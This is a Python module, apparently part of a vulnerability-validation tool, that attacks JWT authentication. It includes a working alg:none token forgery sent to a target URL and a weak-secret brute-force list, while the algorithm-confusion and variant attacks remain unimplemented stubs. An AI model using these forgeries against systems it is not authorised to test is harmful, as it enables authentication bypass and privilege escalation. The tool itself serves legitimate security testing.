"""
active_validator/jwt_attacker.py
──────────────────────────────────
Attaques actives sur les tokens JWT.
Tests : alg:none, weak secret brute-force, algorithm confusion (RS256 → HS256).
"""

import jwt
import base64
import json
import httpx
from typing import List, Dict, Any, Optional


# ─── Liste de secrets faibles à tester ───────────────────────────────────────
COMMON_WEAK_SECRETS: List[str] = [
    # Les plus communs
    "secret", "password", "123456", "key", "test", "admin",
    "qwerty", "letmein", "changeme", "default", "pass",
    # Spécifiques JWT
    "mysecret", "jwt_secret", "app_secret", "token", "signing_key",
    "your-256-bit-secret", "supersecret", "private", "jwtpassword",
    # Noms d'applications courants
    "insecurebank", "android", "mobile", "myapp", "application",
    # Clés courtes/triviales
    "a", "1", "abc", "key123", "test123", "hello", "world",
]


class JWTAttacker:
    """
    Effectue des attaques JWT réelles contre un serveur.
    Chaque méthode retourne un evidence dict avec vulnerability_confirmed et proof.
    """

    def analyze_jwt_static(self, token: str) -> List[Dict[str, Any]]:
        findings = []
        try:
            parts = token.split('.')
            if len(parts) < 2:
                findings.append({"type": "JWT_FORMAT_ERROR", "severity": "LOW", "description": "Format JWT invalide (manque des points)."})
                return findings
                
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
            
            if header.get('alg', '').lower() == 'none':
                findings.append({"type": "JWT_ALG_NONE", "severity": "CRITICAL", "description": "L'algorithme 'none' est autorisé dans le header."})
            
            if 'exp' not in payload:
                findings.append({"type": "JWT_NO_EXPIRATION", "severity": "HIGH", "description": "Le token n'a pas de date d'expiration (exp)."})
            
            sensitive_keys = ['password', 'secret', 'role', 'admin', 'email']
            for key in sensitive_keys:
                if key in payload:
                    findings.append({"type": "JWT_SENSITIVE_DATA", "severity": "MEDIUM", "description": f"Donnée sensible trouvée dans le payload : {key}"})

        except Exception as e:
            findings.append({"type": "JWT_PARSE_ERROR", "severity": "LOW", "description": f"Erreur lors du parsing du JWT: {str(e)}"})
        
        return findings

    async def attack_alg_none(
        self,
        token: str,
        target_url: str,
        method: str = "GET",
    ) -> Dict[str, Any]:
        try:
            parts = token.split('.')
            payload = parts[1]
            
            # Forger le header {"alg": "none", "typ": "JWT"}
            new_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
            forged_token = f"{new_header}.{payload}."
            
            async with httpx.AsyncClient() as client:
                headers = {"Authorization": f"Bearer {forged_token}"}
                resp = await client.request(method, target_url, headers=headers)
                
                success = resp.status_code == 200
                return {
                    "vulnerability_confirmed": success,
                    "forged_token": forged_token,
                    "status_code": resp.status_code,
                    "summary": "Serveur vulnérable à alg:none !" if success else "Serveur a rejeté le token sans signature."
                }
        except Exception as e:
            return {"error": str(e)}

    async def attack_weak_secret(
        self,
        token: str,
        target_url: str,
        custom_secrets: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """
        ATTAQUE : Brute force du secret HMAC sur COMMON_WEAK_SECRETS.

        Méthode :
        1. Essayer chaque secret de la liste pour vérifier la signature
        2. Si un secret fonctionne → re-signer avec des claims modifiés (role: admin)
        3. Tester le token forgé sur le serveur

        Returns:
            Evidence avec secret_found, privilege_escalation, proof
        """
        # TODO: boucler sur COMMON_WEAK_SECRETS + custom_secrets
        # TODO: jwt.decode(token, secret, algorithms=[...]) dans try/except
        # TODO: si secret trouvé → forger un token admin et tester
        raise NotImplementedError("attack_weak_secret — à implémenter")

    async def attack_algorithm_confusion(
        self,
        token: str,
        public_key: str,
        target_url: str,
    ) -> Dict[str, Any]:
        """
        ATTAQUE : Confusion RS256 → HS256.
        Si le serveur utilise RS256, tenter de signer avec la clé publique comme secret HMAC.

        Returns:
            Evidence avec attack_successful
        """
        # TODO: re-signer le token avec la clé publique comme secret HS256
        # TODO: envoyer et vérifier la réponse
        raise NotImplementedError("attack_algorithm_confusion — à implémenter")

    async def attack_none_variants(
        self,
        token: str,
        target_url: str,
    ) -> Dict[str, Any]:
        """
        ATTAQUE : Tester toutes les variantes de 'none' (None, NONE, nOnE, etc.).
        Certains serveurs filtrent "none" mais pas les variantes.

        Returns:
            Evidence avec la variante qui fonctionne si trouvée
        """
        # TODO: générer les variantes : none, None, NONE, nOnE, NoNe, ...
        # TODO: tester chacune
        raise NotImplementedError("attack_none_variants — à implémenter")
